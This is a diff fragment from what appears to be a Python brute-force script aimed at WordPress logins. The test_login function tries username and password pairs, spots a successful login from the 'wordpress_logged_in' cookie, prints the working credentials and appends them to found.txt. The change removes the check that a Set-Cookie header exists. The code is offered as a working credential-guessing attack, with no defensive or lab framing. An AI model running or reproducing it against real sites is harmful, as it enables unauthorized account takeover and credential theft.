@@ -128,13 +128,13 @@ def test_login (url,user,password,cnt,attempts):
 	if "Google Authenticator code" in response.text:
 		print("[-] 2FA is enabled Sorry [-]")
 		sys.exit(0)
-	if response.headers['Set-Cookie']:
-		if "wordpress_logged_in" in response.headers['Set-Cookie']:
-			print("[+] Found Login Username: "+user+" Password: "+password+" on attempt "+str(cnt)+" [+]")
-			text_file = open("found.txt", "a")
-			text_file.write(""+url+" Found Login Username: "+user+" Password: "+password+"\n")
-			text_file.close()
-			sys.exit(0)
+
+	if "wordpress_logged_in" in response.headers['Set-Cookie']:
+		print("[+] Found Login Username: "+user+" Password: "+password+" on attempt "+str(cnt)+" [+]")
+		text_file = open("found.txt", "a")
+		text_file.write(""+url+" Found Login Username: "+user+" Password: "+password+"\n")
+		text_file.close()
+		sys.exit(0)
 	else:
 		print("[-] Login Failed for Username: "+user+" Password: "+password+" on attempt "+str(cnt)+" [-]")
 	cnt += 1
